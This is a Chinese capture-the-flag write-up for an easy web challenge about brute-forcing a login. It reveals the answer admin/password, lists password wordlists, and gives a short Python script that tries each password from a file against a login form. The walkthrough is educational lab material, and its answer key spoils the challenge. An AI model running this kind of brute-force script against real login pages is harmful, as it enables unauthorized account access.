# 艺术就是爆炸

- 作者：ksks
- 参考：-
- 难度：Trivial
- 分类：Web
- 镜像：[svuctf-helloworld-2023/crack](https://ghcr.io/svuctf/svuctf-helloworld-2023/crack)
- 端口：80

## 题目描述

## 题目解析

考点：爆破用户名密码

帐号根据提示已知 `admin`，密码是 `password`。

手动测试常用密码其实就可以，可以在网上搜索常用的密码（默认密码、弱密码）。

这里推荐两个仓库，它们收集了各用途的密码字典：

- [TheKingOfDuck/fuzzDicts](https://github.com/TheKingOfDuck/fuzzDicts)
- [danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)

使用工具爆破也可以，搜索 `BurpSuite 爆破`，网上文章很多。

如果编写脚本的话，大概长这个样子：

```python
import requests

session = requests.session()
url = "http://IP:PORT/login"

with open("passwords.txt") as f:
    passwords = f.readlines()

for pwd in passwords:
    data = {"username": "admin", "password": pwd.rstrip()}
    resp = session.post(url, data=data)
    if "Wrong" not in resp.text:
        print(resp.text)
```